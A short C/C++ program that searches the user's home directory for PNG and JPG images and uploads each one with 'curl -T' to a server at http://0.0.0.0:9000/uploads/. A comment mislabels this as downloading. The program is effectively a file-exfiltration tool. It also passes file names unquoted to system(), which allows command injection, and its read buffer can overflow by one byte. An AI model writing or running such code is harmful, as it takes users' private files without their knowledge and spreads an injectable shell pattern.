#include <unistd.h>
#include <string>
#include <sys/types.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/wait.h>


// int exec_child(char *command)
// {
//     int pid = fork();
//     if (pid == 0)
//     {
//         system(command);
//         exit(1); 
//     }
//     else
//     {
//         wait(NULL);
//     }
//     return 0;
// }


int main(int ac, char **av, char **env)
{
    int fds[2];
    pipe(fds);
    pid_t pid = fork();
    if (pid < 0)
        perror("Child");
    if (pid == 0)
    {
        close(fds[0]);
        dup2(fds[1], 1);
        char *args[8];
        args[0] = strdup("/usr/bin/find");
        args[1] = strdup(getenv("HOME"));;
        args[2] = "-iname";
        args[3] = "*.png";
        args[4] = "-o";
        args[5] = "-iname";
        args[6] = "*.jpg";
        args[7] = NULL;
        execve(args[0], args, env);
        exit(1);
    }
    else
    {
        close(fds[1]);
        printf("hanged\n");
        wait(NULL);
        char buff[2000];
        int readen = read(fds[0], buff, sizeof(buff));
        buff[readen] = 0;
        printf("%s\n", buff);
        close(fds[0]);
        char *token = strtok(buff, "\n");
        while (token != NULL)
        {
            // Download the file using curl (assuming curl is installed)
            char command[1000];
            int num = snprintf(command, sizeof(command), "curl -T %s http://0.0.0.0:9000/uploads/", token);
            command[num] = 0;
            system(command);
            token = strtok(NULL, "\n");
        }
    }
    return 0;
}
